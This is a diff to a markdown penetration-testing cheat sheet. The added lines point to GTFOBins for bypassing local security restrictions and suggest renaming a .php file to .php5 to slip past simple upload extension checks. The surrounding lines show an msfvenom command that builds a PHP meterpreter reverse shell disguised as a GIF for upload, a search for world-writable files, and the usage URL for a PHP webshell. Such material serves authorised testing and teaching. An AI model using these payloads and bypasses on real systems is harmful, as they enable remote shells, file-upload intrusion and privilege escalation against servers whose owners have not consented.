@@ -504,6 +504,9 @@ or
 - find all writable files for current user
 `> find / -perm -o+w`
 
+- bypass local security restrictions:
+https://gtfobins.github.io/
+
 #### gather system information
 - get current distribution
 `> lsb_release -a`
@@ -554,6 +557,9 @@ or
 #### crate a php reverse shell in a evil gif file for upload
 	> echo GIF98 > evil.gif
 	> msfvenom -p php/meterpreter/reverse_tcp lhost='ip' lport='port' >> evil.gif´
+OR
+
+Just rename the .php in php5 in case of simple extention checking. 
 
 #### simple php webshell [php]
 - post upload usage: http://'hostip'/path/to/shell.php?cmd='cmd'
